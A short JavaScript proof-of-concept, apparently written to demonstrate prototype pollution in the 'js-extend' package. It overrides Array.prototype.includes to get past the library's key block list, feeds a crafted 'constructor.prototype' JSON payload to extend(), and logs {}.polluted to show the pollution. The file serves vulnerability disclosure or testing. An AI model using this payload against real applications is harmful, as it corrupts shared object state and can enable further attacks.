Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const jsExtend = require('js-extend');
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
jsExtend.extend({}, JSON.parse(malicious_payload));
console.log({}.polluted);